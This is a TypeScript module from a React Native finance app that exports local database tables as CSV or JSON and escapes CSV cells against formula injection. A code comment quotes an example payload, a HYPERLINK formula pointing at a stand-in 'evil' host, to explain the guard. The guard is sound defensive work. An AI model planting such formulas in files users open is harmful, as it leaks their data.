// Data export — CSV (transactions only) or full JSON dump (all tables).
// Originally lived inline in v1's app/(tabs)/more.tsx. Lifted here so any tab
// can import it (used by Me in v2).

import { Alert } from 'react-native';
import * as FileSystem from 'expo-file-system/legacy';
import * as Sharing from 'expo-sharing';
import { getRawDB } from '@/utils/db/client';

export type ExportFormat = 'json' | 'csv';

export async function exportData(format: ExportFormat = 'json'): Promise<void> {
  const raw = getRawDB();
  let payload: string;
  let ext: string;
  let mime: string;

  if (format === 'csv') {
    const rows = raw.getAllSync<Record<string, unknown>>(
      `SELECT * FROM transactions ORDER BY date DESC`,
    );
    const cols = [
      'id',
      'type',
      'amount',
      'category',
      'account_id',
      'to_account_id',
      'note',
      'date',
      'recurring_id',
      'halal_status',
    ];
    const header = cols.join(',');
    const lines = rows.map((r) => cols.map((c) => csvEscape(r[c])).join(','));
    payload = [header, ...lines].join('\n');
    ext = 'csv';
    mime = 'text/csv';
  } else {
    const transactions = raw.getAllSync(`SELECT * FROM transactions`);
    const accounts = raw.getAllSync(`SELECT * FROM accounts`);
    const budgets = raw.getAllSync(`SELECT * FROM budgets`);
    const recurring = raw.getAllSync(`SELECT * FROM recurring`);
    const paidItems = raw.getAllSync(`SELECT * FROM paid_items`);
    const merchantMemory = raw.getAllSync(`SELECT * FROM merchant_memory`);
    payload = JSON.stringify(
      { transactions, accounts, budgets, recurring, paidItems, merchantMemory },
      null,
      2,
    );
    ext = 'json';
    mime = 'application/json';
  }

  const file = `${FileSystem.cacheDirectory}moneyflow-${Date.now()}.${ext}`;
  await FileSystem.writeAsStringAsync(file, payload);
  if (await Sharing.isAvailableAsync()) {
    await Sharing.shareAsync(file, { mimeType: mime });
  } else {
    Alert.alert('Saved', `File written to ${file}`);
  }
}

// CSV escape with formula-injection guard. Cells starting with =, +, -, @,
// tab, or CR are interpreted as formulas by Excel / Sheets / Numbers — a
// crafted note like `=HYPERLINK("http://evil","click")` would exfiltrate
// when the user opens the export. Prefix those cells with `'` so they're
// rendered as literal text. CWE-1236.
function csvEscape(v: unknown): string {
  if (v == null) return '';
  let s = String(v).replace(/"/g, '""');
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n]/.test(s) ? `"${s}"` : s;
}
